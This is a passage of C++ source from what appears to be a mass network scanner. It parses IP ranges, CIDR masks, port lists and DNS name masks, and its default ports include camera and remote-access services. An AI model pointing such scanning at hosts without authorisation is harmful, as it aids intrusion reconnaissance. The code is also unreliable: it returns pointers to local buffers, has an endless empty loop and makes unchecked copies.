	int i = 0;
	GlobalNegativeSize = 0;

	if(nFile != NULL)
	{
		while(fgets((char*)buffFG, sizeof(buffFG), nFile) != NULL)
		{
			if(buffFG[0] != '#' && buffFG[0] != ' ' && buffFG[0] != '\n' && buffFG[0] != '\r' && strcmp(buffFG, "") != 0 && 
				((buffFG[0] == '/' && buffFG[1] == '/') == false) && ((buffFG[0] == '\t' && buffFG[1] == '\t' && buffFG[2] == '\t' && (buffFG[3] == 13 || buffFG[3] == 10 || buffFG[3] == '#')) == false)
				&& (buffFG[0] == '\t' && buffFG[1] == '\t' && buffFG[2] == '\t' && (buffFG[3] == '/' && buffFG[4] == '/')) == false)
			{
				++GlobalNegativeSize;
			};
			ZeroMemory(buffFG, sizeof(buffFG));
		};

		rewind(nFile);
		if(strcmp(cp, "UTF") == 0) fseek(nFile, 3, 0);

		GlobalNegatives = new char*[GlobalNegativeSize + 2];

		while(fgets(buffFG, sizeof(buffFG), nFile) != NULL)
		{
			if(buffFG[0] == '#' || buffFG[0] == ' ' || buffFG[0] == '\n' || buffFG[0] == '\r' || strcmp(buffFG, "") == 0 || 
				(buffFG[0] == '/' && buffFG[1] == '/')) 
			{
				ZeroMemory(buffFG, sizeof(buffFG));
				continue;
			};

			if(buffFG[0] == '\t' && buffFG[1] == '\t' && buffFG[2] == '\t')
			{
				char buffFGT[256] = {0};
				strcpy(buffFGT, buffFG);
				char *ptr1 = strstr(buffFGT, "\t\t\t");
				ZeroMemory(buffFG, sizeof(buffFG));
				strcpy(buffFG, ptr1 + 3);
			};

			int bSz = strlen(buffFG);
			if((bSz == 2 && buffFG[0] == 13 && buffFG[1] == 10) || (bSz == 1 && (buffFG[0] == 13 || buffFG[0] == 10)))
			{
				ZeroMemory(buffFG, sizeof(buffFG));
				continue;
			};
			if(buffFG[bSz] == 13 || buffFG[bSz] == 10) 
			{
				buffFG[bSz] = '\0';
			};
			if(buffFG[bSz - 1] == 13 || buffFG[bSz - 1] == 10) 
			{
				buffFG[bSz - 1] = '\0';
			};
			if(buffFG[bSz - 2] == 13 || buffFG[bSz - 2] == 10) 
			{
				buffFG[bSz - 2] = '\0';
			};

			if(strstr((char*)buffFG, "\n") != 0) 
			{				
                std::string res;
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
                res = xcode(buffFG, CP_UTF8, CP_ACP);
#else
                res = std::string(buffFG);
#endif
				int sz = res.size();
				GlobalNegatives[i] = new char[sz + 1];
                ZeroMemory(GlobalNegatives[i], sizeof(*GlobalNegatives[i]));
				memcpy(GlobalNegatives[i], toLowerStr(res.c_str()).c_str(), sz - 1);
				memset(GlobalNegatives[i] + sz - 1, '\0', 1);
				++i;
			}
			else 
			{
                std::string res;
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
                res = xcode(buffFG, CP_UTF8, CP_ACP);
#else
                res = std::string(buffFG);
#endif
				int sz = res.size();
				GlobalNegatives[i] = new char[sz + 1];
                ZeroMemory(GlobalNegatives[i], sizeof(*GlobalNegatives[i]));
				memcpy(GlobalNegatives[i], toLowerStr(res.c_str()).c_str(), sz);
				memset(GlobalNegatives[i] + sz, '\0', 1);
				++i;
			};
		
			unsigned char buffcpy2[256] = {0};
			int sz = strlen((char*)buffFG);
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
			strncpy((char*)buffcpy2, xcode(buffFG, CP_ACP, CP_UTF8).c_str(), sz);
#else
			strncpy((char*)buffcpy2, buffFG, sz);
#endif
			ZeroMemory(buffFG, sizeof(buffFG));
		};

		stt->doEmitionGreenFoundData("Negative list loaded (" + QString::number(GlobalNegativeSize) + " entries)");
		ZeroMemory(buffFG, sizeof(buffFG));
		fclose(nFile);
	}
	else
    {
		stt->doEmitionRedFoundData("No negative list found");
        stt->doEmitionKillSttThread();
	};
}

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
unsigned char* ASCIItoUNICODE (unsigned char ch)
{
    unsigned char Val[2];
    if ((ch < 192)&&(ch != 168)&&(ch != 184))  {Val[0] = 0; Val[1] = ch;    return Val;}
    if (ch == 168) {Val[0] = 208;   Val[1] = 129;   return Val;}
    if (ch == 184) {Val[0] = 209;   Val[1] = 145;   return Val;}
    if (ch < 240)  {Val[0] = 208;   Val[1] = ch-48; return Val;}
    if (ch < 249)  {Val[0] = 209;   Val[1] = ch-112;        return Val;}
}
#endif

std::string xcode(LPCSTR src, UINT srcCodePage, UINT dstCodePage) {
    std::string res;
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
    int wsize = MultiByteToWideChar(srcCodePage, 0, src, -1, 0, 0);
    LPWSTR wbuf = (LPWSTR)new char[wsize * sizeof(WCHAR)];
    MultiByteToWideChar(srcCodePage, 0, src, -1, wbuf, wsize);
    int size = WideCharToMultiByte(dstCodePage, 0, wbuf, -1, 0, 0, 0, 0);
    char * buf = (char *)new char[size];
    WideCharToMultiByte(dstCodePage, 0, wbuf, -1, buf, size, 0, 0);
    delete wbuf;

	res.append(buf);
    delete buf;
#else
    unsigned int size = 0;
    while (src[size++]!=0);
    char * buf = (char *)new char[size];
    unsigned char uni[16] = {0};

    size=0;
    while (src[size]!=0)
    {

    };
    delete buf;
#endif
	return res;
}
void _NegativeLoader() {
    FILE *nFile = fopen("negatives.txt", "rb");

	if( nFile != NULL)
	{
		unsigned char b[3] = {0};
		fread(b,1,2, nFile);
		if( b[0] == 0xEF && b[1] == 0xBB)
		{
			fread(b,1,1,nFile); // 0xBF
			ReadUTF8(nFile, "UTF");
		}
		else
		{
			ReadUTF8(nFile, "1251");
		};
    }
}

void CheckMaskBits(char *res, int index) {
	char *bitsStr = strstr(res, "/");
	int bitsNum = atoi(bitsStr + 1);
	int finalBit = 1;
	int bitCounter = 0;

	if(bitsNum <= 32 && bitsNum > 24) //4 octet
	{
		bitCounter = 32 - bitsNum;
		for(int i = 0; i < bitCounter; i++) finalBit *= 2;
		ipsstartfl[index][0] = ipsendfl[index][0] = octet[0];
		ipsstartfl[index][1] = ipsendfl[index][1] = octet[1];
		ipsstartfl[index][2] = ipsendfl[index][2] = octet[2];
		ipsstartfl[index][3] = octet[3];
		ipsendfl[index][3] = octet[3] + finalBit - 1;

	}
	else if(bitsNum <= 24 && bitsNum > 16) //3 octet
	{
		bitCounter = 24 - bitsNum;
		for(int i = 0; i < bitCounter; i++) finalBit *= 2;
		ipsstartfl[index][0] = ipsendfl[index][0] = octet[0];
		ipsstartfl[index][1] = ipsendfl[index][1] = octet[1];
		ipsstartfl[index][2] = octet[2];
		ipsendfl[index][2] = octet[2] + finalBit - 1;
		ipsstartfl[index][3] = octet[3];
		ipsendfl[index][3] = 255;
	}
	else if(bitsNum <= 16 && bitsNum > 8) //2 octet
	{
		bitCounter = 16 - bitsNum;
		for(int i = 0; i < bitCounter; i++) finalBit *= 2;
		ipsstartfl[index][0] = ipsendfl[index][0] = octet[0];
		ipsstartfl[index][1] = octet[1];
		ipsendfl[index][1] = octet[1] + finalBit - 1;
		ipsstartfl[index][2] = octet[2];
		ipsendfl[index][2] = 255;		
		ipsstartfl[index][3] = octet[3];
		ipsendfl[index][3] = 255;

	}
	else if(bitsNum <= 8 && bitsNum > 0) //1 octet
	{
		bitCounter = 8 - bitsNum;
		for(int i = 0; i < bitCounter; i++) finalBit *= 2;
		ipsstartfl[index][0] = octet[0];
		ipsendfl[index][0] = octet[0] + finalBit - 1;
		ipsstartfl[index][1] = octet[1];
		ipsendfl[index][1] = 255;
		ipsstartfl[index][2] = octet[2];
		ipsendfl[index][2] = 255;		
		ipsstartfl[index][3] = octet[3];
		ipsendfl[index][3] = 255;
	}
	else
	{
        stt->doEmitionRedFoundData("[CheckMaskBits] Cannot parse IP list");
        stt->doEmitionKillSttThread();
	};
}

void GetOctets(char *curIP) {
	char *str1;
	char *str2;
	char temp[8] = {0};

	if(strstr(curIP, ".") != NULL) 
	{
		str1 = strstr(curIP, "."); //1
		strncpy(temp, curIP, str1 - curIP);
		octet[0] = atoi(temp);

		ZeroMemory(temp, sizeof(temp));
	}
	else
	{
		str1 = strstr(curIP, "/");
		strncpy(temp, curIP, str1 - curIP);

		octet[0] = atoi(temp);
		octet[1] = 0;
		octet[2] = 0;
		octet[3] = 0;
		return;
	};

	if(strstr(str1 + 1, ".") != NULL)
	{
		str2 = strstr(str1 + 1, "."); //2
		strncpy(temp, str1 + 1, str2 - str1);
		octet[1] = atoi(temp);

		ZeroMemory(temp, sizeof(temp));
	}
	else
	{		
		str2 = strstr(str1 + 1, "/");
		strncpy(temp, str1 + 1, str2 - str1);

		octet[1] = atoi(temp);
		octet[2] = 0;
		octet[3] = 0;
		return;
	};

	if(strstr(str2 + 1, ".") != NULL) 
	{
		str1 = strstr(str2 + 1, "."); //3
		strncpy(temp, str2 + 1, str1 - str2);
		octet[2] = atoi(temp);

		ZeroMemory(temp, sizeof(temp));
	}
	else
	{
		str1 = strstr(str2 + 1, "/");
		strncpy(temp, str2 + 1, str1 - str2);

		octet[2] = atoi(temp);
		octet[3] = 0;
		return;
	};

	if(strstr(str1 + 1, ".") != NULL) 
	{
		str2 = strstr(str1 + 1, "."); //4
		strncpy(temp, str1 + 1, str2 - str1);
		octet[3] = atoi(temp);

		ZeroMemory(temp, sizeof(temp));
	}
	else
	{
		str2 = strstr(str1 + 1, "/");
		strncpy(temp, str1 + 1, str2 - str1 - 1);

		octet[3] = atoi(temp);
		return;
	};
}

void FileLoader(char *str) {
    char curIP[256] = {0}, curIPCopy[256] = {0};
	unsigned int importFileSize = 0;

	FILE *fl = fopen(str, "r");
	if(fl != NULL)
	{
		while(fgets((char*)curIP, sizeof(curIP), fl) != NULL)
		{
			if(curIP[0] != '#' && curIP[0] != ' ' && curIP[0] != '\n' && curIP[0] != '\r' && strcmp(curIP, "") != 0 && 
				((curIP[0] == '/' && curIP[1] == '/') == false) && ((curIP[0] == '\t' && curIP[1] == '\t' && curIP[2] == '\t' && (curIP[3] == 13 || curIP[3] == 10 || curIP[3] == '#')) == false)
				&& (curIP[0] == '\t' && curIP[1] == '\t' && curIP[2] == '\t' && (curIP[3] == '/' && curIP[4] == '/')) == false)
			{
				++importFileSize;
			};
			ZeroMemory(curIP, sizeof(curIP));
		};

		ipsstartfl = new unsigned char*[importFileSize + 2];
		ipsendfl = new unsigned char*[importFileSize + 2];
		starterIP = new unsigned char*[importFileSize + 2];
		ZeroMemory(ipsstartfl, importFileSize);
		ZeroMemory(ipsendfl, importFileSize);
		ZeroMemory(starterIP, importFileSize);
		for(int i = 0; i < importFileSize; ++i)
		{
			ipsstartfl[i] = new unsigned char[4];
			ipsendfl[i] = new unsigned char[4];
			starterIP[i] = new unsigned char[4];
			
			ZeroMemory(ipsstartfl[i], 4);
			ZeroMemory(ipsendfl[i], 4);
			ZeroMemory(starterIP[i], 4);
		};

		rewind(fl);

		while(fgets(curIP, 256, fl) != NULL)
		{
			if(curIP[0] != '#' && curIP[0] != ' ' && curIP[0] != '\n' && curIP[0] != '\r' && strcmp(curIP, "") != 0 && 
				((curIP[0] == '/' && curIP[1] == '/') == false) && ((curIP[0] == '\t' && curIP[1] == '\t' && curIP[2] == '\t' && (curIP[3] == 13 || curIP[3] == 10 || curIP[3] == '#')) == false)
				&& (curIP[0] == '\t' && curIP[1] == '\t' && curIP[2] == '\t' && (curIP[3] == '/' && curIP[4] == '/')) == false)
			{
				strcpy(curIPCopy, curIP);
				char *ptr1 = strstr(curIP, " ");
				if(ptr1 != NULL) curIP[(int)(ptr1 - curIP)] = '\0';
				ptr1 = strstr(curIP, "	");
				if(ptr1 != NULL) curIP[(int)(ptr1 - curIP) - 1] = '\0';
				ptr1 = strstr(curIP, "#");
				if(ptr1 != NULL) curIP[(int)(ptr1 - curIP) - 1] = '\0';
				if(strcmp(curIP, "") == 0 || strcmp(curIP, " ") == 0 || strcmp(curIP, "\r\n") == 0 || strcmp(curIP, "\n") == 0 || curIP[0] == ' ' || curIP[0] == '#') 
				{
					ZeroMemory(curIPCopy, sizeof(curIPCopy));
					ZeroMemory(curIP, sizeof(curIP));
					continue;
				};

				if(strstr(curIP, "-") != NULL)
				{
					bool firstPart = true;
					int offset = 0;
					int curNIndex = 0;
					char curS;
					char curN[32] = {0};
					for(int i = 0; i < strlen(curIP); ++i)
					{
						curS = curIP[i];
						if(curS == '.') 
						{
							if(firstPart) 
							{
								starterIP[flCounter][offset] = atoi(curN);
								ipsstartfl[flCounter][offset] = atoi(curN);
							}
							else ipsendfl[flCounter][offset] = atoi(curN);
							++offset;
							curNIndex = 0;
							ZeroMemory(curN, 32);
							continue;
						}
						else if(curS == '-') 
						{
							if(firstPart) 
							{
								starterIP[flCounter][offset] = atoi(curN);
								ipsstartfl[flCounter][offset] = atoi(curN);
							}
							else ipsendfl[flCounter][offset] = atoi(curN);
							offset = 0;
							firstPart = false;
							curNIndex = 0;
							ZeroMemory(curN, 32);
							continue;
						};
						curN[curNIndex++] = curS;
						if(i == strlen(curIP) - 1)
						{
							ipsendfl[flCounter][offset] = atoi(curN);
						};
					};

					if(ipsstartfl[flCounter][0] > ipsendfl[flCounter][0]
					|| (ipsstartfl[flCounter][0] >= ipsendfl[flCounter][0] 
						&& ipsstartfl[flCounter][1] > ipsendfl[flCounter][1]
						)
					|| (ipsstartfl[flCounter][0] >= ipsendfl[flCounter][0] 
						&& ipsstartfl[flCounter][1] >= ipsendfl[flCounter][1]
						&& ipsstartfl[flCounter][2] > ipsendfl[flCounter][2]
						)
					|| (ipsstartfl[flCounter][0] >= ipsendfl[flCounter][0] 
						&& ipsstartfl[flCounter][1] >= ipsendfl[flCounter][1]
						&& ipsstartfl[flCounter][2] >= ipsendfl[flCounter][2]
						&& ipsstartfl[flCounter][3] > ipsendfl[flCounter][3]
						)
					)
					{
						char tempMsg[256] = {0};
						strcpy(tempMsg, "[IP Loader]Wrong list format. Line-> [");
						strcat(tempMsg, std::to_string(flCounter).c_str());
						strcat(tempMsg, "] String-> [");
						strcat(tempMsg, curIPCopy);
						strcat(tempMsg, "]");
						stt->doEmitionRedFoundData(QString(tempMsg));
						return;
					};

					gTargets += 256*256*256*(ipsendfl[flCounter][0] - ipsstartfl[flCounter][0]);
					gTargets += 256*256*(ipsendfl[flCounter][1] - ipsstartfl[flCounter][1]);
					gTargets += 256*(ipsendfl[flCounter][2] - ipsstartfl[flCounter][2]);
					gTargets += (ipsendfl[flCounter][3] - ipsstartfl[flCounter][3]);
					++flCounter;
				}
				else if(strstr(curIP, "/") != NULL)
                {
					int mask = 0;
					char *ptr1 = strstr(curIP, "/");
					GetOctets(curIP);

					mask = atoi(ptr1 + 1);
					unsigned char mOctet[4];
					mOctet[0] = 1;
					mOctet[1] = 1;
					mOctet[2] = 1;
					mOctet[3] = 1;

					if(mask >= 24)
					{
						mOctet[0] = 255;
						mOctet[1] = 255;
						mOctet[2] = 255;
						for(int i = 0; i < mask - 24 - 1; ++i)
						{
							mOctet[3] = mOctet[3] << 1;
							mOctet[3] |= 1;
						};
						mOctet[3] = mOctet[3] << 8 - (mask - 24);
					}
					else if(mask >= 16)
					{
						mOctet[0] = 255;
						mOctet[1] = 255;
						for(int i = 0; i < mask - 16 - 1; ++i)
						{
							mOctet[2] = mOctet[2] << 1;
							mOctet[2] |= 1;
						};
						mOctet[2] = mOctet[2] << 8 - (mask - 16);
						mOctet[3] = 0;
					}
					else if(mask >= 8)
					{
						mOctet[0] = 255;
						for(int i = 0; i < mask - 8 - 1; ++i)
						{
							mOctet[1] = mOctet[1] << 1;
							mOctet[1] |= 1;
						};
						mOctet[1] = mOctet[1] << 8 - (mask - 8);
						mOctet[2] = 0;
						mOctet[3] = 0;
					}
					else
					{
						for(int i = 0; i < mask - 1; ++i)
						{
							mOctet[0] = mOctet[0]<< 1;
							mOctet[0] |= 1;
						};
						mOctet[0] = mOctet[0] << 8 - mask;
						mOctet[1] = 0;
						mOctet[2] = 0;
						mOctet[3] = 0;
					};
				
					unsigned char ocRes = 0;
					for(int i = 0; i < 4; ++i)
					{
						ocRes = octet[i]&mOctet[i];
						starterIP[flCounter][i] = ocRes;
						ipsstartfl[flCounter][i] = ocRes;
						if(mOctet[i] == 255) ipsendfl[flCounter][i] = octet[i];
						else ipsendfl[flCounter][i] = octet[i]|~mOctet[i];
					};

					gTargets += pow((float)2, (32 - mask));
					++flCounter;
				}
				else if(strstr(curIP, "RESTORE_IMPORT_SESSION") != NULL)
				{
					///DUMMY///
				}
				else
				{
					char tempMsg[256] = {0};
					strcpy(tempMsg, "[IP Loader]Wrong list format. Line-> [");
					strcat(tempMsg, std::to_string(flCounter).c_str());
					strcat(tempMsg, "] String-> [");
					strcat(tempMsg, curIPCopy);
					strcat(tempMsg, "]");
					stt->doEmitionRedFoundData(QString(tempMsg));
					return;
				};
				ZeroMemory(curIP, sizeof(curIP));
			};
		};
		gTargets -= 1;
		gTargetsOverall = gTargets;
		targets = gTargets;

		stt->doEmitionYellowFoundData("List loader - [OK] (" + QString::number(gTargetsOverall + 1) + " hosts)");
		fclose(fl);
	}
	else
	{
		stt->doEmitionRedFoundData("[IP Loader] Cannot open IP list.");
	};
}

char *GetCIDRRangeStr(char *str) {
	char result[128] = {0};
	char start[32] = {0};
    char end[32] = {0};

	int mask = 0;
	char *ptr1 = strstr(str, "/");
	GetOctets(str);

	mask = atoi(ptr1 + 1);
	unsigned char mOctet[4];
	mOctet[0] = 1;
	mOctet[1] = 1;
	mOctet[2] = 1;
	mOctet[3] = 1;

	if(mask >= 24)
	{
		mOctet[0] = 255;
		mOctet[1] = 255;
		mOctet[2] = 255;
		for(int i = 0; i < mask - 24 - 1; ++i)
		{
			mOctet[3] = mOctet[3] << 1;
			mOctet[3] |= 1;
		};
		mOctet[3] = mOctet[3] << 8 - (mask - 24);
	}
	else if(mask >= 16)
	{
		mOctet[0] = 255;
		mOctet[1] = 255;
		for(int i = 0; i < mask - 16 - 1; ++i)
		{
			mOctet[2] = mOctet[2] << 1;
			mOctet[2] |= 1;
		};
		mOctet[2] = mOctet[2] << 8 - (mask - 16);
		mOctet[3] = 0;
	}
	else if(mask >= 8)
	{
		mOctet[0] = 255;
		for(int i = 0; i < mask - 8 - 1; ++i)
		{
			mOctet[1] = mOctet[1] << 1;
			mOctet[1] |= 1;
		};
		mOctet[1] = mOctet[1] << 8 - (mask - 8);
		mOctet[2] = 0;
		mOctet[3] = 0;
	}
	else
	{
		for(int i = 0; i < mask - 1; ++i)
		{
			mOctet[0] = mOctet[0]<< 1;
			mOctet[0] |= 1;
		};
		mOctet[0] = mOctet[0] << 8 - mask;
		mOctet[1] = 0;
		mOctet[2] = 0;
		mOctet[3] = 0;
	};


    sprintf(start, "%d.%d.%d.%d", octet[0]&mOctet[0],
            octet[1]&mOctet[1],
            octet[2]&mOctet[2],
            octet[3]&mOctet[3]);

    unsigned char tempRes0 = 0;
    unsigned char tempRes1 = 0;
    unsigned char tempRes2 = 0;
    unsigned char tempRes3 = 0;

    if(mOctet[0] == 255) tempRes0 = octet[0];
    else tempRes0 = octet[0]|~mOctet[0];
    if(mOctet[1] == 255) tempRes1 = octet[1];
    else tempRes1 = octet[1]|~mOctet[1];
    if(mOctet[2] == 255) tempRes2 = octet[2];
    else tempRes2 = octet[2]|~mOctet[2];
    if(mOctet[3] == 255) tempRes3 = octet[3];
    else tempRes3 = octet[3]|~mOctet[3];

    sprintf(end, "%d.%d.%d.%d", tempRes0,
            tempRes1,
            tempRes2,
            tempRes3);

    sprintf(result, "%s-%s", start, end);

	return result;
}
int fInit(int InitMode, char *gR) {
    strcpy(metaRange, gR);
    if (InitMode == 0)
    {
        if(strstr(gR, "/") != NULL)
        {
            ++flCounter;

            char *str1;
            char *str2;
            char res[8] = {0};

            GetOctets(gR);

            if(strstr(gR, ".") != NULL)
            {
                str1 = strstr(gR, ".");  //1 byte
                strncpy(res, gR, (int)((char*)str1 - gR));
            }
            else strcpy(res, gR);

            if(strstr(res, "/") != NULL)
            {
                CheckMaskBits(res, flCounter);
            }
            else
            {
                starterIP[flCounter][0] = atoi(res);
                ipsstartfl[flCounter][0] = atoi(res);
                ipsendfl[flCounter][0] = atoi(res);
            };
            ZeroMemory(res, sizeof(res));

            if(strstr(str1 + 1, ".") != NULL)
            {
                str2 = strstr(str1 + 1, "."); //2 byte
                strncpy(res, str1 + 1, (int)((char*)str2 - str1) - 1);
            }
            else strcpy(res, str1 + 1);

            if(strstr(res, "/") != NULL)
            {
                CheckMaskBits(res, flCounter);
            }
            else
            {
                starterIP[flCounter][1] = atoi(res);
                ipsstartfl[flCounter][1] = atoi(res);
                ipsendfl[flCounter][1] = atoi(res);
            };

            ZeroMemory(res, sizeof(res));

            if(strstr(str2 + 1, ".") != NULL)
            {
                str1 = strstr(str2 + 1, "."); //3 byte
                strncpy(res, str2 + 1, (int)((char*)str1 - str2) - 1);
            }
            else strcpy(res, str2 + 1);

            if(strstr(res, "/") != NULL)
            {
                CheckMaskBits(res, flCounter);
            }
            else
            {
                starterIP[flCounter][2] = atoi(res);
                ipsstartfl[flCounter][2] = atoi(res);
                ipsendfl[flCounter][2] = atoi(res);
            };
            ZeroMemory(res, sizeof(res));

            if(strstr(str1 + 1, ".") != NULL)
            {
                str2 = strstr(str1 + 1, "."); //4 byte
                strncpy(res, str1 + 1, (int)((char*)str2 - str1) - 1);
            }
            else strcpy(res, str1 + 1);

            if(strstr(res, "/") != NULL)
            {
                CheckMaskBits(res, flCounter);
            }
            else
            {
                starterIP[flCounter][3] = atoi(res);
                ipsstartfl[flCounter][3] = atoi(res);
                ipsendfl[flCounter][3] = atoi(res);
            };

            ipsstart[0] = ipsstartfl[flCounter][0];
            ipsstart[1] = ipsstartfl[flCounter][1];
            ipsstart[2] = ipsstartfl[flCounter][2];
            ipsstart[3] = ipsstartfl[flCounter][3];

            ipsend[0] = ipsendfl[flCounter][0];
            ipsend[1] = ipsendfl[flCounter][1];
            ipsend[2] = ipsendfl[flCounter][2];
            ipsend[3] = ipsendfl[flCounter][3];
        }
        else
        {
            int x;
            char des1[64] = {0};

            for(int i = 0; i < 3; i++)																		//Filling the range-starting ip mass.
            {
                x = strcspn(gR, ".");
                memcpy(des1, gR, x*sizeof(int));
                memset(gR, ' ', x + 1);
                ipsstart[i] = atoi(des1);
                ZeroMemory(des1, sizeof(des1));
                if(ipsstart[i] > 255)
                {
                    stt->doEmitionRedFoundData("[Error] Incorrect range.");
                    stt->doEmitionKillSttThread();
                    return -1;
                };
            };

            x = strcspn(gR, "-");
            if(strstr(gR, "-") == NULL)
            {
                stt->doEmitionRedFoundData("[Error] Incorrect range.");
                stt->doEmitionKillSttThread();
                return -1;
            };

            memcpy(des1, gR, x);
            ipsstart[3] = atoi(des1);
            memset(gR, ' ', x + 1);

            if(strstr(gR, ".") == NULL)
            {
                stt->doEmitionRedFoundData("[Error] Incorrect range.");
                stt->doEmitionKillSttThread();
                return -1;
            };

            for(int i = 0; i < 4; i++)																		//Filling the range-closing ip mass.
            {
                x = strcspn(gR, ".");
                memcpy(des1, gR, x);
                memset(gR, ' ', x + 1);
                ipsend[i] = atoi(des1);

                if(ipsend[i] > 255)
                {
                    stt->doEmitionRedFoundData("[Error] Incorrect range.");
                    stt->doEmitionKillSttThread();
                    return -1;
                };
            };

        };
        if((ipsstart[0] > ipsend[0])
            ||
            (
            (ipsstart[0] >= ipsend[0]) && (ipsstart[1] > ipsend[1])
            ) ||
            (
            (ipsstart[0] >= ipsend[0]) && (ipsstart[1] >= ipsend[1]) && (ipsstart[2] > ipsend[2])
            ) ||
            (
            (ipsstart[0] >= ipsend[0]) && (ipsstart[1] >= ipsend[1]) && (ipsstart[2] >= ipsend[2]) && (ipsstart[3] > ipsend[3])
            )
            )
        {
            stt->doEmitionRedFoundData("[Error] Incorrect range.");
            stt->doEmitionKillSttThread();
            return -1;
        };

        targets = numOfIps(ipsstart, ipsend);
    };
}

int ParseArgs(int argc, char *argv[]) {
	int s = 0;
	int indexPorts = 0;
	
	if(strstr(argv[1], "-f") != NULL)
	{
		gThreads = atoi(argv[3]);
		threads = gThreads;

		FileLoader(argv[2]);
		gMode = -1;
	}
	else
	{
		gMode = atoi(argv[1]);

		if(gMode == 0) //Mode 0 (IP scan)
		{
			gThreads = atoi(argv[3]);
		}
		else if(gMode == 1) //Mode 1 (DNS scan)
		{
			strcpy(gFirstDom, argv[3]);
			gThreads = atoi(argv[4]);
		};

		threads = gThreads;
	};

	if(gMode == 0)
	{
		if(strstr(argv[2], "-") != NULL)
		{
            strcpy(gRange, argv[2]);
		}
        else  if(strstr(argv[2], "/") != NULL)
        {
            strcpy(gRange, GetCIDRRangeStr(argv[2]));
        }
        else
        {
            strcpy(gRange, argv[2]);
            strcat(gRange, "-");
            strcat(gRange, argv[2]);
        };

        strcpy(saveEndIP, gRange);
        strcpy(finalIP, strstr(gRange, "-") + 1);
	}
	else if(gMode == 1)
	{
		if(strstr(argv[2], "/") != NULL)
		{
			strcpy(gRange, argv[2]);
            strcpy(saveEndIP, argv[2]);
		}
		else
		{
			strcpy(gRange, argv[2]);
            strcpy(saveEndIP, gRange);
		};

	};

	for(int i = 1; i <= argc - 1; i++)
	{
		s += strlen(argv[i]) + 2;
	};

	char *argString = new char [s + 1];
    ZeroMemory(argString, sizeof(*argString));

	for(int i = 1; i <= argc - 1; i++)
	{
		strcat(argString, argv[i]);
		if(i != argc - 1) strcat(argString, "::");
	};

	if(strstr(argString, "-p") != NULL)
	{
		char *portString = strstr(argString, "-p");
		char p[4096] = {0};
		if(strstr(portString, "::") != NULL) 
		{
			strncpy(gPorts, portString, (int)(strstr(portString, "::") - portString));
			strncpy(p, strstr(argString, "-p") + 2, (int)(strstr(portString, "::") - portString));
		}
		else
		{
			strcpy(gPorts, portString);
			strcpy(p, strstr(argString, "-p") + 2);
		};
		char *lex;

		if(strstr(p, ",") != NULL)
		{
			
			lex = strtok(p, ",");
			portArr[indexPorts++] = atoi(lex);	

			while ((lex = strtok(NULL, ",")) != NULL) 
			{ 
				portArr[indexPorts++] = atoi(lex);
				overallPorts++;
			};
		}
		else if(strstr(p, "-") != NULL)
		{
			char *startp;
			char *endp;
			char buffForPorts[16] = {0};
			
			lex = strtok(p, "-p");
			startp = lex;
			lex = strtok(NULL, "-");
			endp = lex;

			for(int i = atoi(startp); i <= atoi(endp); i++ )
			{
				portArr[indexPorts++] = i;				
				overallPorts++;
			};

			ZeroMemory(buffForPorts, sizeof(buffForPorts));
		}
		else
		{
			
			lex = strtok(p, "-p");
			portArr[indexPorts++] = atoi(lex);
		};
	}
	else
	{
		portArr[0] = 80;
		portArr[1] = 81;
		portArr[2] = 88;
		portArr[3] = 8080;
		portArr[4] = 8081;
		portArr[5] = 60001;
		portArr[6] = 60002;
		portArr[7] = 8008;
		portArr[8] = 8888;
		portArr[9] = 554;
		portArr[10] = 9000;
		portArr[11] = 441;
		portArr[12] = 4111;
		portArr[13] = 6667;
		portArr[14] = 3536;
		portArr[15] = 22;
		portArr[16] = 21;

		overallPorts = 16;

		strcpy(gPorts, "--DEFAULT");
	};

    ZeroMemory(argString, sizeof(*argString));

	delete[] argString;

return 0;
}
	
char charAll[38] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 
			'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 
			'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '_', '-'};

int _getPos(char l) {
	for(int i = 0; i < 38; ++i)
	{
		if(l == charAll[i]) return i;
	};
	return -1;
}

int _getChunkCount(char *data) {
	int firstPos = _getPos(data[1]);
	int secondPos = _getPos(data[2]);
	return secondPos - firstPos + 1;
}

int _GetDNSFromMask(char *mask, char *saveMask, char *saveMaskEnder) {

	if(strstr(mask, "[") != NULL)
    {
		char maskEnd[1024] = {0};
		char maskRes[1024] = {0};
		char *ptr1 = strstr(mask, "[");
		char *ptr2 = strstr(ptr1, "]");
		int sz = ptr2 - ptr1;
		char chunk[8] = {0};
		strncpy(chunk, ptr1, sz + 1);
		int firstPos = _getPos(chunk[1]);
		int secondPos = _getPos(chunk[2]);

		if(firstPos > secondPos)
		{
			stt->doEmitionRedFoundData("Error at mask (Wrong letter sequence)");
			return -1;
		};

		char maskStart[1024] = {0};
		int startPosition = strstr(mask, "[") - mask;
		strncpy(maskStart, mask, startPosition);

		char maskEntry[1024] = {0};
		if(saveMaskEnder != NULL) 
		{
			int startSavePosition = strstr(saveMaskEnder, "[") - saveMaskEnder;
			strncpy(maskEntry, saveMaskEnder, startSavePosition);
		};

		int szMask = strlen(mask);
		int szOffset = startPosition + 2;
		if(szMask != szOffset) strcpy(maskEnd, strstr(mask, "]") + 1);
        else ZeroMemory(maskEnd, sizeof(maskEnd));;

		char maskSaver[128] = {0};
		if(firstPos != -1 && secondPos != -1)
		{
			for(int i = firstPos; i <= secondPos; ++i)
			{
                if(!globalScanFlag) break;

				strcpy(maskSaver, saveMask);
				strcat(maskSaver, maskEntry);
				chunk[1] = charAll[i];
				strcat(maskSaver, chunk);
				strcpy(maskRes, maskStart);
				maskRes[startPosition] = charAll[i];
				strcat(maskRes, maskEnd);

				if(_GetDNSFromMask(maskRes, maskSaver, maskEnd) == -1) return -1;

				ZeroMemory(maskSaver, sizeof(maskSaver));	
				ZeroMemory(maskRes, sizeof(maskRes));	
			};
		};
	}
	else
    {
        strcpy(currentIP, saveMask);

        while(cons >= gThreads && globalScanFlag) Sleep(300);
        if(!globalScanFlag) return 0;

        string res = string(mask);
		verboseProgressDNS(--gTargets, res.c_str(), top_level_domain);
        res += string(top_level_domain);

		++indexIP;

        Threader::fireThread(res, (void*(*)(void))_connect);
